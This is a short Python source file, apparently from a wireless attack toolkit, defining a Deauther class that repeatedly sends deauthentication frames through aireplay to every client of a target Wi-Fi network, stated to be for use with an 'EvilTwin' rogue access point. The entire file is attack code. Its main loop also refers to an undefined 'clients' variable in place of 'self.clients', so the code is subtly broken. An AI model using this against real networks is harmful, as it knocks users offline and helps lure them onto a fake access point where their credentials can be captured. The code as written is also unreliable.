#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

import time

from ..tools.aireplay import Aireplay
from ..tools.ifconfig import Ifconfig

class Deauther(object):
    '''
    Deauthenticates clients associated with a target.
    For use with EvilTwin.
    '''

    def __init__(self, interface, target):
        self.interface = interface
        self.interface_mac = Ifconfig.get_mac(interface)
        self.target = target
        self.running = False
        self.clients = set()


    def update_target(self, target):
        # Refresh target (including list of clients)
        self.target = target


    def update_clients(self):
        # Refreshes list of clients connected to target
        for client in self.target.clients:
            bssid = client.station
            if bssid.lower() == self.interface_mac:
                continue  # Ignore this interface
            elif bssid not in self.clients:
                self.clients.add(bssid)


    def start(self):
        self.running = True

        while self.running:
            # Refresh list of clients
            self.update_clients()

            # Deauth clients
            bssid = self.target.bssid
            essid = self.target.essid if self.target.essid_known else None
            for client_mac in clients:
                Aireplay.deauth(bssid, essid=essid, client_mac=client_mac)

            time.sleep(1)


    def stop(self):
        self.running = False

